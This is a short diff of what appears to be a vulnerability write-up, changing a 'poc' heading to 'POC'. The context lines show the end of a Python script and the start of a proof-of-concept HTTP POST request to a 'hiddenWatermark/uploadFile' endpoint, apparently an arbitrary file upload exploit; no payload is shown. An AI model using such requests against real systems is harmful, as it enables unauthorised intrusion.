@@ -33,7 +33,7 @@ except Exception as e:
     print(e)
 ```
 
-## poc
+## POC
 ```
 POST /CDGServer3/hiddenWatermark/uploadFile HTTP/1.1
 Host: 127.0.0.1
